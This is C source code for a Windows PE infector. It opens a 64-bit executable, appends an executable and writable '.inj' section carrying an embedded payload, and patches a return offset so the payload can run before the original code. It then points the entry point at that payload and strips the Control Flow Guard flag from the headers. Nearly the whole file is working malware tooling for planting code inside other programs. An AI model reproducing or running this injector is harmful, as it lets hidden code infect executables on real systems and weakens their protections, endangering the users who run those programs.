#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#ifndef IMAGE_DLLCHARACTERISTICS_GUARD_CF
#define IMAGE_DLLCHARACTERISTICS_GUARD_CF 0x4000
#endif

#define ALIGN_UP(x, align) (((x) + (align) - 1) & ~((align) - 1))
#define MAX(x, y) (((x) > (y)) ? (x) : (y))

int inject(const char *filename) {

    extern char __start_code;
    extern char __end_code;
    BYTE *payload = (BYTE *)&__start_code;
    DWORD payload_size = (DWORD)(&__end_code - &__start_code);

    extern uint64_t delta;

    printf("[DEBUG] Opening file: %s\n", filename);
    HANDLE hFile = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Unable to open file\n");
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("[DEBUG] File size: %lu\n", fileSize);
    BYTE *fileBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!fileBuffer) {
        printf("[ERROR] Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[ERROR] File read failed\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    printf("[DEBUG] File loaded into memory\n");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[ERROR] Invalid DOS signature\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    printf("[DEBUG] DOS signature OK\n");

    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(fileBuffer + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[ERROR] Invalid NT signature or architecture\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    printf("[DEBUG] NT signature and architecture OK\n");

    DWORD file_align = nt->OptionalHeader.FileAlignment;
    DWORD section_align = nt->OptionalHeader.SectionAlignment;
    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    IMAGE_SECTION_HEADER *lastSection = &sections[nt->FileHeader.NumberOfSections - 1];
    DWORD lastSectionSize = MAX(lastSection->Misc.VirtualSize, lastSection->SizeOfRawData);

    printf("[DEBUG] Last section at virtual address 0x%08X\n", lastSection->VirtualAddress);

    IMAGE_SECTION_HEADER newSection = {0};
    memcpy(newSection.Name, ".inj", 4);
    newSection.VirtualAddress = ALIGN_UP(lastSection->VirtualAddress + lastSectionSize, section_align);
    newSection.PointerToRawData = ALIGN_UP(lastSection->PointerToRawData + lastSection->SizeOfRawData, file_align);
    newSection.Misc.VirtualSize = payload_size;
    newSection.SizeOfRawData = ALIGN_UP(payload_size, file_align);
    newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    printf("[DEBUG] New section .inj RVA=0x%08X, RAW=0x%08X, size=%lu\n", newSection.VirtualAddress, newSection.PointerToRawData, payload_size);

    // Patch delta in payload copy
    size_t offset_delta = (size_t)((BYTE *)&delta - payload);
    BYTE *payload_copy = (BYTE *)malloc(payload_size);
    if (!payload_copy) {
        printf("[ERROR] Memory allocation for payload failed\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    memcpy(payload_copy, payload, payload_size);

    // Calculate old entry point relative offset inside image base
    int64_t oldEntryPointOffset = (int64_t)(nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint) -
                                  (int64_t)(nt->OptionalHeader.ImageBase + newSection.VirtualAddress);

    *(uint64_t *)(payload_copy + offset_delta) = (uint64_t)oldEntryPointOffset;
    printf("[DEBUG] Patch delta at offset %zu with value 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);

    // Update headers: increase number of sections and size of image
    WORD oldNumberOfSections = nt->FileHeader.NumberOfSections;
    nt->FileHeader.NumberOfSections += 1;
    nt->OptionalHeader.SizeOfImage = newSection.VirtualAddress + ALIGN_UP(payload_size, section_align);
    nt->OptionalHeader.AddressOfEntryPoint = newSection.VirtualAddress;
    printf("[DEBUG] New entry point: 0x%08X\n", nt->OptionalHeader.AddressOfEntryPoint);

    // Disable Control Flow Guard (CFG)
    nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_GUARD_CF;
    printf("[DEBUG] CFG disabled in headers\n");

    // Write NT headers and all section headers
    SetFilePointer(hFile, dos->e_lfanew, NULL, FILE_BEGIN);
    DWORD ntHeadersSize = sizeof(IMAGE_NT_HEADERS64) + nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    BYTE *ntHeadersBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, ntHeadersSize);
    if (!ntHeadersBuffer) {
        printf("[ERROR] Memory allocation for NT headers failed\n");
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    memcpy(ntHeadersBuffer, nt, sizeof(IMAGE_NT_HEADERS64));
    memcpy(ntHeadersBuffer + sizeof(IMAGE_NT_HEADERS64), sections, oldNumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    memcpy(ntHeadersBuffer + sizeof(IMAGE_NT_HEADERS64) + oldNumberOfSections * sizeof(IMAGE_SECTION_HEADER), &newSection, sizeof(IMAGE_SECTION_HEADER));

    printf("[DEBUG] Writing NT headers and sections...\n");
    DWORD bytesWritten;
    if (!WriteFile(hFile, ntHeadersBuffer, ntHeadersSize, &bytesWritten, NULL) || bytesWritten != ntHeadersSize) {
        printf("[ERROR] Writing NT headers failed\n");
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, ntHeadersBuffer);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, ntHeadersBuffer);

    // Write payload to new section
    printf("[DEBUG] Writing payload to new section...\n");
    SetFilePointer(hFile, newSection.PointerToRawData, NULL, FILE_BEGIN);
    if (!WriteFile(hFile, payload_copy, payload_size, &bytesWritten, NULL) || bytesWritten != payload_size) {
        printf("[ERROR] Writing payload failed\n");
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }

    // Zero out the rest of the raw section (padding)
    if (newSection.SizeOfRawData > payload_size) {
        DWORD zeroSize = newSection.SizeOfRawData - payload_size;
        BYTE *zeroBuffer = (BYTE *)calloc(1, zeroSize);
        if (!zeroBuffer) {
            printf("[ERROR] Memory allocation for padding failed\n");
            free(payload_copy);
            HeapFree(GetProcessHeap(), 0, fileBuffer);
            CloseHandle(hFile);
            return 1;
        }
        printf("[DEBUG] Padding of %lu bytes added to .inj section\n", zeroSize);
        if (!WriteFile(hFile, zeroBuffer, zeroSize, &bytesWritten, NULL) || bytesWritten != zeroSize) {
            printf("[ERROR] Writing padding failed\n");
            free(zeroBuffer);
            free(payload_copy);
            HeapFree(GetProcessHeap(), 0, fileBuffer);
            CloseHandle(hFile);
            return 1;
        }
        free(zeroBuffer);
    }

    printf("[DEBUG] Injection completed successfully!\n");
    free(payload_copy);
    HeapFree(GetProcessHeap(), 0, fileBuffer);
    CloseHandle(hFile);

    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <exe file>\n", argv[0]);
        return 1;
    }

    return inject(argv[1]);
}
